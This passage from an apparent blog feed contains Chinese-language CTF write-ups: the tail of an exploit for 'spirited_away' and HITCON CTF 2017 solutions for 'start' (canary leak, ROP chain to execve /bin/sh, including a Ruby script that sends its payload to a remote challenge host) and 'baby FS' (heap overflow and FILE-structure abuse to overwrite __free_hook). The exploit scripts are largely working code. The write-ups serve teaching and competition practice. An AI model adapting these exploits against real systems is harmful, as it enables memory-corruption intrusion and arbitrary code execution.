&lt;y/n&gt;: "</span>)</div><div class="line">    r.send(<span class="string">"y"</span>)</div><div class="line">    _leave_comment(<span class="string">"11"</span>, <span class="string">"cc"</span>)</div><div class="line"></div><div class="line">r.recvuntil(<span class="string">"Would you like to leave another comment? &lt;y/n&gt;: "</span>)</div><div class="line">r.send(<span class="string">"y"</span>)</div><div class="line">_leave_comment(<span class="string">"11"</span>, <span class="string">"c"</span>*<span class="number">0x38</span>)</div><div class="line">r.recvuntil(<span class="string">"Reason: "</span>)</div><div class="line">r.recv(<span class="number">0x38</span>)</div><div class="line">ret = r.recv(<span class="number">4</span>)</div><div class="line">comment_ptr = u32(ret) - <span class="number">0xc8</span></div><div class="line">log.success(<span class="string">"[COMMENT POINTER] =&gt; &#123;&#125;"</span>.format(hex(comment_ptr)))</div><div class="line">    </div><div class="line">fake_chunk_addr = comment_ptr + <span class="number">80</span> + <span class="number">8</span> + <span class="number">8</span></div><div class="line">log.success(<span class="string">"[FAKE CHUNK POINTER] =&gt; &#123;&#125;"</span>.format(hex(fake_chunk_addr)))</div><div class="line">    </div><div class="line"><span class="comment"># stage 2 dup fake chunk into stack</span></div><div class="line">fake_comment  = <span class="string">"A"</span> * <span class="number">80</span></div><div class="line">fake_comment += p32(<span class="number">0x80</span>) <span class="comment"># fake age </span></div><div class="line">fake_comment += p32(fake_chunk_addr) <span class="comment"># fake name ptr</span></div><div class="line"></div><div class="line"></div><div class="line">fake_reason  = p32(<span class="number">0</span>)</div><div class="line">fake_reason += p32(<span class="number">0x41</span>)</div><div class="line">fake_reason += <span class="number">0x38</span> * <span class="string">"\x00"</span></div><div class="line">fake_reason += p32(<span class="number">0</span>) <span class="comment"># for next chunk PREV_SIZE check</span></div><div class="line">fake_reason += p32(<span class="number">0x41</span>)</div><div class="line"></div><div class="line">r.recvuntil(<span class="string">"Would you like to leave another comment? &lt;y/n&gt;: "</span>)</div><div class="line">r.send(<span class="string">"y"</span>)</div><div class="line">leave_comment(<span class="string">"a"</span>, <span class="string">"11"</span>, fake_reason, fake_comment)</div><div class="line"></div><div class="line"><span class="comment"># stage 3 overwrite return address for memory leak</span></div><div class="line"></div><div class="line">payload  = <span class="string">"A"</span> * <span class="number">0x4c</span></div><div class="line">payload += p32(elf.plt[<span class="string">"puts"</span>])</div><div class="line">payload += p32(elf.symbols[<span class="string">"survey"</span>])</div><div class="line">payload += p32(elf.got[<span class="string">"free"</span>])</div><div class="line"></div><div class="line">r.recvuntil(<span class="string">"Would you like to leave another comment? &lt;y/n&gt;: "</span>)</div><div class="line">r.send(<span class="string">"y"</span>)</div><div class="line">leave_comment(payload, <span class="string">"11"</span>, <span class="string">"aa"</span>, <span class="string">"aa"</span>)</div><div class="line"></div><div class="line">r.recvuntil(<span class="string">"Would you like to leave another comment? &lt;y/n&gt;: "</span>)</div><div class="line">r.send(<span class="string">"n"</span>)</div><div class="line"></div><div class="line">r.recvuntil(<span class="string">"Bye!\n"</span>)</div><div class="line">ret = r.recv(<span class="number">4</span>)</div><div class="line">free_addr = u32(ret)</div><div class="line"></div><div class="line">system_addr = free_addr + (libc.symbols[<span class="string">"system"</span>] - libc.symbols[<span class="string">"free"</span>])</div><div class="line">sh_addr = free_addr + (next(libc.search(<span class="string">"/bin/sh"</span>)) - libc.symbols[<span class="string">"free"</span>])</div><div class="line"></div><div class="line">log.success(<span class="string">"[FREE] =&gt; &#123;&#125;"</span>.format(hex(free_addr)))</div><div class="line">log.success(<span class="string">"[SYSTEM] =&gt; &#123;&#125;"</span>.format(hex(system_addr)))</div><div class="line">log.success(<span class="string">"[BINSH] =&gt; &#123;&#125;"</span>.format(hex(sh_addr)))</div><div class="line"></div><div class="line"><span class="comment"># 3th rop</span></div><div class="line"></div><div class="line">leave_comment(<span class="string">"11"</span>, <span class="string">"11"</span>, <span class="string">"11"</span>, <span class="string">"11"</span>)</div><div class="line"></div><div class="line">fake_chunk_addr += <span class="number">8</span></div><div class="line"></div><div class="line">fake_comment  = <span class="string">"A"</span> * <span class="number">80</span></div><div class="line">fake_comment += p32(<span class="number">0x80</span>) <span class="comment"># fake age </span></div><div class="line">fake_comment += p32(fake_chunk_addr) <span class="comment"># fake name ptr</span></div><div class="line"></div><div class="line"></div><div class="line">fake_reason  = p32(<span class="number">0</span>)</div><div class="line">fake_reason += p32(<span class="number">0x41</span>)</div><div class="line">fake_reason += <span class="number">0x38</span> * <span class="string">"\x00"</span></div><div class="line">fake_reason += p32(<span class="number">0</span>) <span class="comment"># for next chunk PREV_SIZE check</span></div><div class="line">fake_reason += p32(<span class="number">0x41</span>)</div><div class="line"></div><div class="line">r.recvuntil(<span class="string">"Would you like to leave another comment? &lt;y/n&gt;: "</span>)</div><div class="line">r.send(<span class="string">"y"</span>)</div><div class="line">leave_comment(<span class="string">"a"</span>, <span class="string">"11"</span>, fake_reason, fake_comment)</div><div class="line"></div><div class="line">payload  = <span class="string">"A"</span> * <span class="number">0x4c</span></div><div class="line">payload += p32(system_addr)</div><div class="line">payload += p32(<span class="number">0xdeadbeef</span>)</div><div class="line">payload += p32(sh_addr)</div><div class="line"></div><div class="line">r.recvuntil(<span class="string">"Would you like to leave another comment? &lt;y/n&gt;: "</span>)</div><div class="line">r.send(<span class="string">"y"</span>)</div><div class="line">leave_comment(payload, <span class="string">"11"</span>, <span class="string">"aa"</span>, <span class="string">"aa"</span>)</div><div class="line"></div><div class="line">r.recvuntil(<span class="string">"Would you like to leave another comment? &lt;y/n&gt;: "</span>)</div><div class="line">r.send(<span class="string">"n"</span>)</div><div class="line"></div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Overview&quot;&gt;&lt;a href=&quot;#Overview&quot; class=&quot;headerlink&quot; title=&quot;Overview&quot;&gt;&lt;/a&gt;Overview&lt;/h2&gt;&lt;p&gt;&lt;code&gt;spirited_away&lt;/code&gt; is a ELF 32-bit LSB
    
    </summary>
    
      <category term="安全" scheme="http://weaponx.site/categories/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="pwn" scheme="http://weaponx.site/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>HITCON CTF 2017 部分pwn题目Writeup</title>
    <link href="http://weaponx.site/2017/11/19/HITCON-CTF-2017-%E9%83%A8%E5%88%86pwn%E9%A2%98%E7%9B%AEWriteup/"/>
    <id>http://weaponx.site/2017/11/19/HITCON-CTF-2017-部分pwn题目Writeup/</id>
    <published>2017-11-20T03:00:59.000Z</published>
    <updated>2017-11-20T03:01:47.574Z</updated>
    
    <content type="html"><![CDATA[<h2 id="HITCON-CTF-2017-QUAL"><a href="#HITCON-CTF-2017-QUAL" class="headerlink" title="HITCON CTF 2017 QUAL"></a>HITCON CTF 2017 QUAL</h2><h3 id="start"><a href="#start" class="headerlink" title="start"></a>start</h3><p>首先，程序有一个<code>alarm</code>函数，这个是一个定时器函数，指定程序运行时间，到了后就给进程发送kill的signal，因为后面我们要调试所以直接用IDA把这个函数PATCH掉。</p>
<p>首先，一看这个程序就是静态编译的，没有引入任何动态库。再用IDA载入，分析<code>main</code>函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></div><div class="line">&#123;</div><div class="line">  __int64 v3; <span class="comment">// rax@2</span></div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@5</span></div><div class="line">  __int64 v5; <span class="comment">// rcx@5</span></div><div class="line">  <span class="keyword">char</span> v6; <span class="comment">// [sp+0h] [bp-20h]@2</span></div><div class="line">  __int64 v7; <span class="comment">// [sp+18h] [bp-8h]@1</span></div><div class="line"></div><div class="line">  v7 = *MK_FP(__FS__, <span class="number">40L</span>L);</div><div class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2L</span>L, <span class="number">0L</span>L);</div><div class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2L</span>L, <span class="number">0L</span>L);</div><div class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</div><div class="line">  &#123;</div><div class="line">    LODWORD(v3) = read(<span class="number">0L</span>L, &amp;v6, <span class="number">217L</span>L);</div><div class="line">    <span class="keyword">if</span> ( v3 == <span class="number">0</span> || !<span class="built_in">strncmp</span>(&amp;v6, <span class="string">"exit\n"</span>, <span class="number">5L</span>L) )</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    <span class="built_in">puts</span>(&amp;v6);</div><div class="line">  &#125;</div><div class="line">  result = <span class="number">0</span>;</div><div class="line">  v5 = *MK_FP(__FS__, <span class="number">40L</span>L) ^ v7;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>程序很简单，一个缓冲区溢出，不过有<code>CANARY</code>保护。</p>
<p>接着，再用<code>checksec</code>检测程序开启的保护措施</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">[*] <span class="string">'/home/user/pwn/hitcon2017/start/start'</span></div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE (0x400000)</div></pre></td></tr></table></figure>
<p>可以看到有还有数据执行保护`NX。</p>
<p>到这里，目前只需要干一件事情，修改程序的执行流程。不过程序有<code>CANARY</code>保护，所以需要一个<code>Memory Leak</code>泄露出<code>CANARY</code>。因为程序用的<code>puts</code>输出，所以不存在格式化字符串漏洞。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">[------------------------------------stack-------------------------------------]</div><div class="line">0000| 0x7fffffffe430 --&gt; 0x4002e0 (&lt;_init&gt;: sub    rsp,0x8)</div><div class="line">0008| 0x7fffffffe438 --&gt; 0x6cc018 --&gt; 0x43b2a0 (&lt;__strcpy_sse2_unaligned&gt;:  mov    rcx,rsi)</div><div class="line">0016| 0x7fffffffe440 --&gt; 0x401770 (&lt;__libc_csu_init&gt;:   push   r14)</div><div class="line">0024| 0x7fffffffe448 --&gt; 0x386c3caae3bb1300 </div><div class="line">0032| 0x7fffffffe450 --&gt; 0x6cc018 --&gt; 0x43b2a0 (&lt;__strcpy_sse2_unaligned&gt;:  mov    rcx,rsi)</div><div class="line">0040| 0x7fffffffe458 --&gt; 0x400e06 (&lt;generic_start_main+582&gt;:    mov    edi,eax)</div><div class="line">0048| 0x7fffffffe460 --&gt; 0x0 </div><div class="line">0056| 0x7fffffffe468 --&gt; 0x100000000 </div><div class="line">[------------------------------------------------------------------------------]</div></pre></td></tr></table></figure>
<p>其中<code>0x7fffffffe430</code>为输入的buff的首地址，<code>0x7fffffffe448</code>为<code>CANARY</code>的地址。所以，只要我们输入25个字节就可以把<code>CANARY</code>泄露出来，在程序返回时再将<code>CANARY</code>修改回去即可绕过栈溢出检测。</p>
<p>因为程序是静态编译，所以可用的ROP Gadget很多，随便写一个ROP Chain即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">payload  = <span class="string">"exit\n"</span></div><div class="line">payload  = payload.ljust(<span class="number">24</span>, <span class="string">"1"</span>)</div><div class="line">payload += p64(canary)</div><div class="line">payload += p64(<span class="number">0xdeadbeef</span>)</div><div class="line">payload += p64(pop_rax_rdx_rbx)</div><div class="line">payload += p64(<span class="number">59</span>)</div><div class="line">payload += <span class="string">"/bin/sh\x00"</span></div><div class="line">payload += p64(<span class="number">0</span>)</div><div class="line">payload += p64(pop_rdi)</div><div class="line">payload += p64(<span class="number">0x6cdb60</span>) <span class="comment"># bss</span></div><div class="line">payload += p64(mov_ptr_rdi_rdx)</div><div class="line">payload += p64(pop_rdx_rsi)</div><div class="line">payload += p64(<span class="number">0</span>)</div><div class="line">payload += p64(<span class="number">0</span>)</div><div class="line">payload += p64(syscall)</div></pre></td></tr></table></figure>
<p>使用<code>syscall</code> + <code>syscall id</code>调用系统函数时要确保<code>argv</code>和<code>envp</code>可读，如果非0的话。</p>
<p>在这里有个坑，因为程序里本身存在<code>sh</code>字符串，本来想利用<code>execve(&quot;sh&quot;, NULL, NULL)</code>调用sh，但是因为无法指定<code>argv</code>所以只能自己构造<code>/bin/sh</code>。</p>
<p>最终的python版本的exploit</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">io = remote(<span class="string">"127.0.0.1"</span>, <span class="number">10001</span>)</div><div class="line"><span class="comment">#io = remote("54.65.72.116", 31337)</span></div><div class="line"></div><div class="line">context.log_level = <span class="string">"DEBUG"</span></div><div class="line"></div><div class="line">payload = <span class="string">"exit\n"</span></div><div class="line"></div><div class="line"></div><div class="line">syscall_id = <span class="number">59</span></div><div class="line">syscall = <span class="number">0x00401466</span></div><div class="line"></div><div class="line">sh = <span class="number">0x4b6f74</span></div><div class="line"></div><div class="line">pop_rax_rdx_rbx = <span class="number">0x0047a781</span> <span class="comment">#: pop rax ; pop rdx ; pop rbx ; ret  ;  (1 found)</span></div><div class="line">pop_rdi = <span class="number">0x00418191</span><span class="comment">#: pop rdi ; ret  ;  (1 found)</span></div><div class="line">pop_rdx_rsi = <span class="number">0x443799</span><span class="comment">#</span></div><div class="line">mov_ptr_rdi_rdx = <span class="number">0x43b673</span> <span class="comment"># mov    QWORD PTR [rdi],rdx, ret</span></div><div class="line"></div><div class="line">raw_input()</div><div class="line"></div><div class="line">io.send(<span class="string">"1"</span>*<span class="number">25</span>)</div><div class="line">io.recv(<span class="number">24</span>)</div><div class="line">canary = io.recv(<span class="number">8</span>)</div><div class="line">canary = u64(canary) - <span class="number">0x31</span></div><div class="line">log.success(<span class="string">"[CANARY] =&gt; &#123;&#125;"</span>.format(hex(canary)))</div><div class="line"></div><div class="line"></div><div class="line">payload  = <span class="string">"exit\n"</span></div><div class="line">payload  = payload.ljust(<span class="number">24</span>, <span class="string">"1"</span>)</div><div class="line">payload += p64(canary)</div><div class="line">payload += p64(<span class="number">0xdeadbeef</span>)</div><div class="line">payload += p64(pop_rax_rdx_rbx)</div><div class="line">payload += p64(<span class="number">59</span>)</div><div class="line">payload += <span class="string">"/bin/sh\x00"</span></div><div class="line">payload += p64(<span class="number">0</span>)</div><div class="line">payload += p64(pop_rdi)</div><div class="line">payload += p64(<span class="number">0x6cdb60</span>) <span class="comment"># bss</span></div><div class="line">payload += p64(mov_ptr_rdi_rdx)</div><div class="line">payload += p64(pop_rdx_rsi)</div><div class="line">payload += p64(<span class="number">0</span>)</div><div class="line">payload += p64(<span class="number">0</span>)</div><div class="line">payload += p64(syscall)</div><div class="line"></div><div class="line">raw_input(<span class="string">"[BOOM]"</span>)</div><div class="line">io.send(payload)</div><div class="line"></div><div class="line">io.interactive()</div></pre></td></tr></table></figure>
<p>结果题目是要求一个ruby的使用pwntools-ruby写的脚本。改成ruby的</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><div class="line"><span class="keyword">require</span> <span class="string">'pwn'</span></div><div class="line"></div><div class="line">z = Sock.new <span class="string">'54.65.72.116'</span>,<span class="number">31337</span></div><div class="line"></div><div class="line">z.recvuntil <span class="string">"&gt; "</span></div><div class="line"></div><div class="line">payload = <span class="string">%&#123;</span></div><div class="line">    r = Sock.new '127.0.0.1',31338</div><div class="line">    p  = "1" * 25</div><div class="line">    r.send p</div><div class="line">    r.recv(24)</div><div class="line">    canary = r.recv(8)</div><div class="line">    canary = u64(canary) - 0x31</div><div class="line"></div><div class="line">    print hex(canary)</div><div class="line">    p  = "exit\n"</div><div class="line">    p  = p.ljust(24, "1")</div><div class="line">    p += p64(canary)</div><div class="line">    p += p64(0) </div><div class="line">    p += p64(0x0047a781) # pop rax rdx rbx</div><div class="line">    p += p64(59)</div><div class="line">    p += "/bin/sh\x00"</div><div class="line">    p += p64(0)</div><div class="line">    p += p64(0x00418191) # pop rdi</div><div class="line">    p += p64(0x6cdb60) # bss</div><div class="line">    p += p64(0x43b673) # mov ptr rdi rdx</div><div class="line">    p += p64(0x443799) # pop rdx rsi</div><div class="line">    p += p64(0)</div><div class="line">    p += p64(0)</div><div class="line">    p += p64(0x00401466)</div><div class="line"></div><div class="line">    </div><div class="line">    r.sendline p</div><div class="line">    r.sendline 'cat home/start/flag'</div><div class="line">    </div><div class="line">    print r.recv</div><div class="line">    print r.recv</div><div class="line">&#125;</div><div class="line"></div><div class="line">z.sendline payload</div><div class="line">print z.recv</div><div class="line">print z.recv</div><div class="line">print z.recv</div></pre></td></tr></table></figure>
<h2 id="baby-FS"><a href="#baby-FS" class="headerlink" title="baby FS"></a>baby FS</h2><p>程序主要有四个功能</p>
<ul>
<li>打开文件<ul>
<li>check文件名有是否有<code>proc</code>和<code>flag</code>字段</li>
</ul>
</li>
<li>读文件</li>
<li>写文件</li>
<li>关闭文件（句柄）</li>
</ul>
<p>粗略看了一下程序，对输入限制的比较死，没有什么越界的漏洞。使用checksec看一下程序开启的保护措施。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">[*] <span class="string">'/home/user/pwn/hitcon2017/babyfs/babyfs.bin'</span></div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Full RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      PIE enabled</div><div class="line">    FORTIFY:  Enabled</div></pre></td></tr></table></figure>
<p>可以看到已经开启了全部的保护措施。所以，必须找一个<code>Memory Leak</code>来泄露内存，再找一个能修改程序执行流程的地方即可pwn掉这个程序。</p>
<p>研究一下，这个程序能内存泄漏的地方只有读文件了，用户输入的地方只有写文件了。所以基本目标定在读写文件，但是怎么能够通过读写文件这两个功能实现内存泄漏和执行流程修改呢？</p>
<p>我们逐个分析这四个函数：</p>
<p>open函数完成的功能很简单，读取用户输入的文件名，将文件的fd和长度，还有内容的指针保存在一个结构体中。其中判断文件名中是否包含<code>proc</code>和<code>flag</code>字符串。</p>
<p>结构体的定义如下：</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">FS</span></span>&#123;</div><div class="line">  FILE *fd;             <span class="comment">// + 0x0</span></div><div class="line">  <span class="keyword">char</span> *content;        <span class="comment">// + 0x8</span></div><div class="line">  <span class="keyword">char</span> filename[<span class="number">64</span>];    <span class="comment">// + 0x10</span></div><div class="line">  <span class="keyword">int</span> content_length;   <span class="comment">// + 0x50</span></div><div class="line">  <span class="keyword">int</span> write_flag;       <span class="comment">// + 0x58</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>结构体在内存中的定义如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">0x555555757060: 0x0000555555758010  0x0000555555759250 <span class="comment"># fd|content(heap)</span></div><div class="line">0x555555757070: 0x0000656d64616572  0x0000000000000000 <span class="comment"># filename(max=63)</span></div><div class="line">0x555555757080: 0x0000000000000000  0x0000000000000000</div><div class="line">0x555555757090: 0x0000000000000000  0x0000000000000000</div><div class="line">0x5555557570a0: 0x0000000000000000  0x0000000000000000</div><div class="line">0x5555557570b0: 0x000000000000004b  0x0000000000000000 <span class="comment"># filelen|write_flag</span></div><div class="line">---------------------------------------------------------------------------</div><div class="line">0x5555557570c0: 0x00005555557592b0  0x000055555575a4f0 <span class="comment"># fd|content(heap)</span></div><div class="line">0x5555557570d0: 0x0000656d64616572  0x0000000000000000 <span class="comment"># filename</span></div><div class="line">0x5555557570e0: 0x0000000000000000  0x0000000000000000</div><div class="line">0x5555557570f0: 0x0000000000000000  0x0000000000000000</div><div class="line">0x555555757100: 0x0000000000000000  0x0000000000000000</div><div class="line">0x555555757110: 0x000000000000004b  0x0000000000000000 <span class="comment"># filelen|write_flag</span></div></pre></td></tr></table></figure>
<p>read函数也很简单，完成的内容是填好结构体的内容，读取文件的n字节到前面结构体的<code>content</code>中。</p>
<p>write函数就是将文件中的第一个字节打印出来。</p>
<p>close函数就是清空结构体，free掉content，关闭fd。</p>
<p>看起来似乎是一个没有漏洞的程序，但是当我们打开<code>/dev/stdin</code>、<code>/dev/stdout</code>或者<code>/dev/stderr</code>时，会发现，文件的长度为<code>-1</code>，在结构体中为<code>0xFFFFFFFFFFFFFFFF</code>，在分配<code>content</code>堆的时候分配的大小为长度加1。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="keyword">if</span> ( !fd )</div><div class="line">&#123;</div><div class="line">  <span class="built_in">puts</span>(<span class="string">"Can't open the file"</span>);</div><div class="line">  <span class="built_in">puts</span>(<span class="string">"Waiting for loggging ..."</span>);</div><div class="line">  sleep(<span class="number">1u</span>);</div><div class="line">  <span class="built_in">snprintf</span>(&amp;error_str, <span class="number">0x400</span>uLL, <span class="string">"Can't open file %s\n"</span>, &amp;filename);</div><div class="line">  log_error_E9F(&amp;error_str);</div><div class="line">  <span class="keyword">return</span> *MK_FP(__FS__, <span class="number">40L</span>L) ^ v5;</div><div class="line">&#125;</div><div class="line">*((_QWORD *)&amp;fd_203060 + <span class="number">12</span> * i) = fd;    </div><div class="line"><span class="built_in">strncpy</span>((<span class="keyword">char</span> *)&amp;fd_203060 + <span class="number">96</span> * i + <span class="number">16</span>, &amp;filename, <span class="number">0x3F</span>uLL);</div><div class="line">*((_QWORD *)&amp;file_len_2030B0 + <span class="number">12</span> * i) = content_len_1198(fd);</div><div class="line">*((_QWORD *)&amp;unk_203068 + <span class="number">12</span> * i) = <span class="built_in">calloc</span>(<span class="number">1u</span>LL, *((_QWORD *)&amp;file_len_2030B0 + <span class="number">12</span> * i) + <span class="number">1L</span>L);<span class="comment">// HERE!</span></div><div class="line">dword_2030B8[<span class="number">24</span> * i] = <span class="number">0</span>;</div></pre></td></tr></table></figure>
<p>此时分配函数为<code>calloc(0)</code>所以分配的堆大小为<code>0x20</code>。那么在获取文件内容的时候只要文件内容大于<code>0x10</code>即可发生堆溢出，那么问题又来了，如何去获取文件内容的长度大于文件长度呢？我们可以通过打开<code>/dev/stdin</code>，我们通过标准输入输入的字符就是文件的内容。</p>
<p>在得到堆溢出后，我们就可以操作FILE结构体看来完成内存泄露（通过打开<code>/dev/stdout</code>），程序控制流劫持（通过修改<code>__free_hook</code>来完成程序流劫持），下面我们看看<code>FILE</code>结构体的定义。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">struct</span> _IO_FILE &#123;</div><div class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></div><div class="line"></div><div class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></div><div class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></div><div class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></div><div class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></div><div class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></div><div class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></div><div class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></div><div class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></div><div class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></div><div class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></div><div class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></div><div class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></div><div class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></div><div class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></div><div class="line"></div><div class="line">  <span class="keyword">struct</span> _IO_marker *_markers;</div><div class="line"></div><div class="line">  <span class="keyword">struct</span> _IO_FILE *_chain;</div><div class="line"></div><div class="line">  <span class="keyword">int</span> _fileno;</div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></div><div class="line">  <span class="keyword">int</span> _blksize;</div><div class="line"><span class="meta">#<span class="meta-keyword">else</span></span></div><div class="line">  <span class="keyword">int</span> _flags2;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></div><div class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</div><div class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</div><div class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</div><div class="line"></div><div class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></div><div class="line"></div><div class="line">  _IO_lock_t *_lock;</div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>有几点需要关注的：</p>
<ul>
<li><code>_fileno</code> 是文件的fd</li>
<li>在调用fread或者fwrite后，关于文件流的8个指针会被修复</li>
<li>通过<code>fopen</code>打开文件后，文件的内存会缓存在<code>kernel buffer</code>中</li>
<li><code>FILE</code>结构体操作的<code>buffer</code>的范围在<code>_IO_buf_base</code>和<code>_IO_buf_end</code>之间</li>
<li>再<code>fclose</code>或者<code>fflush</code>的时候会将<code>buffer</code>中的内容同步到文件中</li>
</ul>
<p>所以EXPLOIT的步骤如下：</p>
<ul>
<li>打开<code>/dev/stdin</code>再随便打开一个文件</li>
<li>通过堆溢出覆盖第二个文件的<code>FILE</code>结构体</li>
<li>通过关闭文件泄露堆的基址</li>
<li>重复上面操作泄露<code>libc</code>的基址</li>
<li>通过上面操作覆盖<code>__free_hook</code>为<code>system</code></li>
<li><code>pwn</code>!</li>
</ul>
<p>下面是我的<code>EXPLOIT</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">context.log_level = <span class="string">"DEBUG"</span></div><div class="line"></div><div class="line">libc = ELF(<span class="string">"./libc-2.23.so"</span>)</div><div class="line">libc_offset = libc.symbols[<span class="string">"_IO_file_jumps"</span>]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">open</span><span class="params">(filename)</span>:</span></div><div class="line">    io.recvuntil(<span class="string">"choice:"</span>)</div><div class="line">    io.sendline(<span class="string">"1"</span>)</div><div class="line">    io.recvuntil(<span class="string">":"</span>)</div><div class="line">    io.sendline(filename)</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">blind_open</span><span class="params">(filename)</span>:</span></div><div class="line">    sleep(<span class="number">1</span>)</div><div class="line">    io.sendline(<span class="string">"1"</span>)</div><div class="line">    sleep(<span class="number">1</span>)</div><div class="line">    io.sendline(filename)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(idx, size)</span>:</span></div><div class="line">    io.recvuntil(<span class="string">"choice:"</span>)</div><div class="line">    io.sendline(<span class="string">"2"</span>)</div><div class="line">    io.recvuntil(<span class="string">":"</span>)</div><div class="line">    io.sendline(str(idx))</div><div class="line">    io.recvuntil(<span class="string">":"</span>)</div><div class="line">    io.sendline(str(size))</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">blind_read</span><span class="params">(idx, size)</span>:</span></div><div class="line">    sleep(<span class="number">1</span>)</div><div class="line">    io.sendline(<span class="string">"2"</span>)</div><div class="line">    sleep(<span class="number">1</span>)</div><div class="line">    io.sendline(str(idx))</div><div class="line">    sleep(<span class="number">1</span>)</div><div class="line">    io.sendline(str(size))</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(idx)</span>:</span></div><div class="line">    io.recvuntil(<span class="string">"choice:"</span>)</div><div class="line">    io.sendline(<span class="string">"3"</span>)</div><div class="line">    io.recvuntil(<span class="string">":"</span>)</div><div class="line">    io.sendline(str(idx))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">blind_write</span><span class="params">(idx)</span>:</span>    </div><div class="line">    sleep(<span class="number">1</span>)</div><div class="line">    io.sendline(<span class="string">"3"</span>)</div><div class="line">    sleep(<span class="number">1</span>)</div><div class="line">    io.sendline(str(idx))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">close</span><span class="params">(idx)</span>:</span></div><div class="line">    io.recvuntil(<span class="string">"choice:"</span>)</div><div class="line">    io.sendline(<span class="string">"4"</span>)</div><div class="line">    io.recvuntil(<span class="string">":"</span>)</div><div class="line">    io.sendline(str(idx))</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">blind_close</span><span class="params">(idx)</span>:</span></div><div class="line">    sleep(<span class="number">1</span>)</div><div class="line">    io.sendline(<span class="string">"4"</span>)</div><div class="line">    sleep(<span class="number">1</span>)</div><div class="line">    io.sendline(str(idx))</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># io = 